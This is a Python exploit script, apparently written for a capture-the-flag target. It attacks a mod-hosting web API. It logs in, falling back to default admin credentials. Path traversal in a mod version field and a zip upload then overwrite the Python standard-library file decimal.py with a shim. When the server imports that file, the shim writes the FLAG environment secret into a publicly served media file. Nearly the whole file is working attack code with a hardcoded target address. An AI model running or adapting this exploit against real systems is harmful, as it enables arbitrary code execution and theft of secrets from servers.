#!/usr/bin/env python3
# Diagnostic: can we OVERWRITE an existing stdlib module (/usr/local/lib/python3.11/decimal.py)?
# We send BOTH zip_file and filelist_file. With filelist_file present the view SKIPS the storage_path
# branch, so:  200 => write to that path succeeded ;  500 => PermissionError (write failed).
# Then trigger /api/schema/ and check if decimal was imported fresh (flag dumped to /data/media).
# Usage: python diag2.py 144.79.188.39:PORT
import io, sys, zipfile, requests, secrets, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:39588"
if not BASE.startswith("http"):
    BASE = "http://" + BASE
S = requests.Session()
OUT = "d" + secrets.token_hex(3) + ".txt"
SHIM = "import os\ntry:\n open('/data/media/" + OUT + "','w').write('FLAG='+os.environ.get('FLAG','')+'\\n')\nexcept Exception:\n pass\n"

def jj(r):
    try: return r.json()
    except Exception:
        print("   non-json", r.status_code, r.text[:100]); return {}

def auth():
    u="g"+secrets.token_hex(4); p="Pw12345!x"
    S.post(f"{BASE}/api/auth/register/", json={"username":u,"password":p}, timeout=15)
    r=S.post(f"{BASE}/api/auth/login/", json={"username":u,"password":p}, timeout=15)
    if r.status_code!=200:
        r=S.post(f"{BASE}/api/auth/login/", json={"username":"palforge_admin","password":"change-me-admin"}, timeout=15)
    return jj(r)["access"]

def H(t): return {"Authorization": f"Bearer {t}"}

def plat(tok, code):
    r=S.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15); d=jj(r)
    items=d.get("results", d) if isinstance(d, dict) else d
    for it in (items or []):
        if isinstance(it,dict) and it.get("code")==code: return it["id"]
    return jj(S.post(f"{BASE}/api/platforms/", headers=H(tok), json={"code":code,"name":"z","description":""}, timeout=15)).get("id")

def main():
    tok=auth(); print("[*] token ok")
    pid=plat(tok,"lib/python3.11")
    mid=jj(S.post(f"{BASE}/api/mods/", headers=H(tok), json={"title":"z","mod_version":"../../../usr/local","release_notes":"","is_enabled":True}, timeout=15))["id"]
    bid=jj(S.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok), json={"platform":pid}, timeout=15))["id"]

    bio=io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("decimal.py", SHIM)
    bio.seek(0)
    r=S.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
             files={"zip_file":("p.zip",bio,"application/zip"),
                    "filelist_file":("f.txt", io.BytesIO(b"x"), "text/plain")}, timeout=25)
    print(f"[*] overwrite /usr/local/lib/python3.11/decimal.py -> {r.status_code}")
    print("    200 => stdlib OVERWRITE WORKS ;  500 => write permission denied")

    for path in ("/api/schema/","/api/docs/"):
        print(f"    GET {path} ->", S.get(f"{BASE}{path}", headers=H(tok), timeout=25).status_code)
    time.sleep(1)
    rr=S.get(f"{BASE}/media/{OUT}", timeout=15)
    print(f"[*] GET /media/{OUT} -> {rr.status_code}", ("<-- decimal imported fresh, FLAG: "+rr.text[:120]) if rr.status_code==200 else "(decimal cached / not imported)")

if __name__ == "__main__":
    main()
